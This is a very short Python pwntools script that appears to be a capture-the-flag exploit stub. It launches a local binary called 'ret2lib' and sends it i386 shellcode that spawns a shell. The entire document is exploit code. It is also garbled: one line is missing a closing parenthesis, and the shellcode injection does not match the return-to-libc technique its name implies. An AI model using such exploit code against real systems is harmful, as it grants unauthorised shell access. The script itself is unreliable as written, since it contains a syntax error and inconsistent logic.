#!/usr/bin/env python3

from pwn import *
p = process("./ret2lib")

p.sendline()
p.sendline(asm(shellcraft.i386.linux.sh())
p.interactive()
